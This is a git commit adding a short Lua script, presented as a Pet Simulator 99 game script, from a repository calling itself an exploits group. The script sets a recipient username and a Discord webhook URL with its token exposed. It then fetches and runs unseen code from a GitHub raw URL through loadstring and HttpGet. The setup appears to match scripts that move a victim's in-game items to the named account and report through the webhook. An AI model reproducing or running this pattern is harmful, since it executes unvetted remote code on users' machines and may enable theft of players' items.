891020183e42776a8d3153f23604d74c54aa6111
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-22 20:15:37 +0200

    Added ps99 script: main_ps_99

---
+++ ps99/main_ps_99.lua
@@ -0,0 +1,5 @@
+Username = "ViZikYt121"
+Username2 = "ViZikYt121"
+Webhook = "https://discord.com/api/webhooks/1364279871408443565/Vl8EHl-n7mqQsZudiitphVSloS5FRV0U3tlAdYYpQRhXYD-I6rsTcFXfw4YD67Lv7qga"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
